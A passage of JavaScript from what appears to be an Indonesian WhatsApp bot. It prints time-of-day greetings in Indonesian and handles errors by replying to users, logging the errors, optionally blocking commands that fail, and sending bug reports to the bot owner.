if (timeWib >= '18:00' && timeWib <= '18:10') {
console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
}
if (timeWib >= '19:00' && timeWib <= '19:10') {
console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
}
if (timeWib >= '20:00' && timeWib <= '20:10') {
console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
}
if (timeWib >= '00:00' && timeWib <= '00:10') {
console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
}
           


		
    } catch (e) {
    e = String(e)  
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
    if(e.includes("BaileysError: Not expecting a response")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Sinyalnya jelek kak atau bisa juga\n               pesan sementara grup masih aktif\n\n© ${fake1}`)
    if(e.includes("Error: read ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Yahaha pasti paket chat 🤣\n\n© ${fake1}`)
    if(e.includes("Error: ENOENT: no such file or directory, open")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Ada yg eror nih kak, file tidak di temukan`)
    if(e.includes("Error: Request failed with status code")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Maap, sudah melebihi batas permintaan\n\n© ${fake1}`)
    await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    
    if(e.includes("protocol")) return 
    if(checkError(e, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
    addError(e, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
    if(autoblockcmd){        
    addblockcmd(command,listcmdblock) 
    await setReply("Command telah di block karena terjadi error")
    }
    if(autoReport){
    await xdev.sendMessage(`${Ownerin}`,`*「 Laporan Bug New 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
    await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
    if(autoblockcmd) return
    setTimeout( () => {
	 xdev.sendMessage(from,"Laporan error telah dikirim ke developer",text)
	},2000)
	}
    }
    } 

    


                    
      







	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message Error : %s', 'white'), color(e, 'green'))
    
        }
	// console.log(e)
	}
}
}




	
    
